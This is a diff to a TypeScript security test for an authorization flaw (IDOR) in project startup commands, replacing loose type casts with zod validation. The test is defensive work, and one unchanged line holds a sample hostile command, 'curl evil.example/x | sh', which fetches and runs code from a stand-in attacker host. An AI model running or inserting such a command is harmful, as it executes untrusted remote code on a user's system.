@@ -17,8 +17,10 @@ mockCoreGitRepoChecks();
 
 import { beforeAll, beforeEach, describe, expect, test } from 'bun:test';
 
+import { z } from 'zod';
+
+import { seedProject } from '../helpers/builders-routes.js';
 import { createTestApp, type TestApp } from '../helpers/test-app.js';
-import { seedProject } from '../helpers/test-db.js';
 
 describe('Startup commands IDOR (security CR-6)', () => {
   let t: TestApp;
@@ -33,7 +35,7 @@ describe('Startup commands IDOR (security CR-6)', () => {
     const res = await t.app.request(`/api/trpc/projects.commands?input=${input}`, {
       headers: headersFor(userId),
     });
-    return { status: res.status, body: (await res.json()) as any };
+    return { status: res.status, body: await res.json() };
   };
 
   const mutate = async (userId: string, procedure: string, input: unknown) => {
@@ -42,7 +44,7 @@ describe('Startup commands IDOR (security CR-6)', () => {
       headers: headersFor(userId),
       body: JSON.stringify(input),
     });
-    return { status: res.status, body: (await res.json()) as any };
+    return { status: res.status, body: await res.json() };
   };
 
   const plant = async () => {
@@ -52,7 +54,7 @@ describe('Startup commands IDOR (security CR-6)', () => {
       command: 'npm run dev',
     });
     expect(created.status).toBe(200);
-    return created.body.result.data.id as string;
+    return z.string().parse(created.body.result.data.id);
   };
 
   beforeAll(async () => {
@@ -62,13 +64,13 @@ describe('Startup commands IDOR (security CR-6)', () => {
   beforeEach(() => {
     t.cleanup();
     // Two users, each with their own project.
-    seedProject(t.db as any, {
+    seedProject(t.db, {
       id: 'p-alice',
       name: 'Alice Project',
       userId: 'alice',
       path: '/tmp/alice',
     });
-    seedProject(t.db as any, {
+    seedProject(t.db, {
       id: 'p-bob',
       name: 'Bob Project',
       userId: 'bob',
@@ -113,10 +115,9 @@ describe('Startup commands IDOR (security CR-6)', () => {
       commandId: id,
       data: { label: 'dev', command: 'curl evil.example/x | sh' },
     });
-    const cmds = (await listCommands('alice', 'p-alice')).body.result.data as Array<{
-      id: string;
-      command: string;
-    }>;
+    const cmds = z
+      .array(z.looseObject({ id: z.string(), command: z.string() }))
+      .parse((await listCommands('alice', 'p-alice')).body.result.data);
     expect(cmds.find((c) => c.id === id)?.command).toBe('npm run dev');
   });
 
